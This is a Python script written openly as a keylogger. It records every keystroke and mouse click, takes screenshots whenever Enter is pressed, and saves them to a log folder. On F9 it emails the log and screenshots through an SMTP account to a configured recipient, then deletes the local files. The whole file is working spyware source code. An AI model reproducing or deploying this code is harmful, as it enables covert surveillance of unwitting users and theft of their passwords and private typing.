# author: brownfox2k6
# 22 February 2024

# Site-packages
from pynput.keyboard import Listener as Keyboard_listener, Key
from pynput.mouse import Listener as Mouse_listener, Button
from pyautogui import screenshot

# stdlibs
from datetime import datetime
from email.mime.application import MIMEApplication
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from json import load
from os import mkdir, listdir
from shutil import rmtree
from smtplib import SMTP
from ssl import create_default_context


def get_time(day=False) -> str:
  """
  Get local time on computer
  """
  format_ = "%d %b %H:%M:%S" if day else "%H:%M:%S"
  return datetime.now().strftime(format_)


def get_screenshot() -> None:
  idx = len(listdir("./s_manifest"))
  ss = screenshot()
  ss.save(f"./s_manifest/ss_{idx}.jpg")


def keyboard_press(key: Key) -> None:
  """
  on_press for keyboard listener.
  """
  # Flag variable, when press F9, exit_ = True,
  # terminate Keyboard listener and also terminate Mouse listener
  global exit_

  # Check if it's an alphanumeric key
  try:
    # Check if it's a combination key - goes with Ctrl
    try:
      key = SPE_CTRL[str(key).replace("'", "")]
      key = f"「{key}」"

    # This can cause ValueError (if it's not a combination key)
    except KeyError:
      key = key.char

  # This can cause AttributeError (if it's a special key)
  except AttributeError:

    # Press F9 -> send mail AND terminate
    if key == Key.f9:
      log_f.write(f"\n\n「Keylogger terminated {get_time(day=True)}」")
      exit_ = True
      send_mail()
      return False

    # Enter -> create new line in log file + get time
    elif key == Key.enter:
      get_screenshot()
      key = f"\n「••   {get_time(day=True)}」 "

    # For aesthetic
    elif key == Key.backspace:
      key = "「«×」"
    elif key == Key.delete:
      key = "「×»」"
    elif key == Key.space:
      key = "「_」"

    else:
        # For aesthetic
      key = str(key).replace("Key.", "")\
            .replace("_l", "").replace("_r", "").replace("_gr", "")
      if key == "shift":
        key = "↑"
      key = f"「{key}」"

  log_f.write(key)


def mouse_click(x, y, button, pressed) -> None:
  """
  on_click for mouse listener.
  """
  if exit_:
    return False
  if pressed:
    if button == Button.left:
      button = 'L'
    elif button == Button.right:
      button = 'R'
    else:
      button = 'M'

    # :>4d: Right aligned text with width=4
    log_f.write(f"\n「{x :>4d} {y :>4d} {button} {get_time()}」 ")


def send_mail() -> None:
  """
  Send keylogger data through Gmail.
  """
  try:
    print("Initialize and login gmail server")
    server = SMTP(host=SMTP_HOST, port=SMTP_PORT)
    server.ehlo()
    server.starttls(context=create_default_context())
    server.ehlo()
    server.login(user=SENDER, password=SMTP_PASSWORD)

    print("Reading log file")
    log_f.seek(0)
    body = log_f.read().strip()
    body = body.replace("\n", "<br>").replace(" ", "&nbsp;")
    body = f'<font size="4" face="Cascadia Mono">{body}</font>'

    print("Initializing message")
    message = MIMEMultipart()
    message["Subject"] = f"Keylogger {get_time(day=True)}"
    message["From"] = SENDER
    message["To"] = RECIPIENT
    message.attach(MIMEText(body, "html", "utf-8"))

    print("Attaching screenshots")
    for f in listdir("./s_manifest"):
      if not f.endswith(".jpg"):
        continue
      with open(f"./s_manifest/{f}", "rb") as ipath:
        p = MIMEApplication(ipath.read(), _subtype="jpg")
        p.add_header("Content-Disposition", f"attachment; filename={f}")
        message.attach(p)

    print("Sending email")
    server.send_message(message)
    server.quit()
    print("Email sent successfully")

    # Delete everything that have just been sent
    log_f.close()
    rmtree("./s_manifest", ignore_errors=True)

  except Exception as err:
    print("Failed to sent email")
    print(err)


if __name__ == "__main__":
  SPE_CTRL = {'A': '\\x01', 'B': '\\x02', 'C': '\\x03', 'D': '\\x04', 'E': '\\x05', 'F': '\\x06', 'G': '\\x07', 'H': '\\x08', 'I': '\\t', 'J': '\\n', 'K': '\\x0b', 'L': '\\x0c', 'M': '\\r', 'N': '\\x0e', 'O': '\\x0f', 'P': '\\x10', 'Q': '\\x11', 'R': '\\x12', 'S': '\\x13', 'T': '\\x14', 'U': '\\x15', 'V': '\\x16', 'W': '\\x17', 'X': '\\x18', 'Y': '\\x19', 'Z': '\\x1a', '0': '<48>', '1': '<49>', '2': '<50>', '3': '<51>', '4': '<52>', '5': '<53>', '6': '<54>', '7': '<55>', '8': '<56>', '9': '<57>'}

  # Initialization
  try:
    mkdir("./s_manifest")
  except FileExistsError:
    pass
  exit_ = False
  log_f = open("./s_manifest/log.txt", mode="a+", encoding="utf-8")
  log_f.write(f"\n\n「Keylogger started {get_time(day=True)}」\n")
  with open("conf.json") as f:
    data = load(f)
    SMTP_HOST = data["smtp_host"]
    SMTP_PORT = data["smtp_port"]
    SENDER = data["sender"]
    SMTP_PASSWORD = data["smtp_password"]
    RECIPIENT = data["recipient"]

  # Create threads
  keyboard = Keyboard_listener(on_press=keyboard_press)
  mouse = Mouse_listener(on_click=mouse_click)

  # Start both threads
  keyboard.start()
  mouse.start()

  # Wait until both threads are completely executed
  keyboard.join()
  mouse.join()
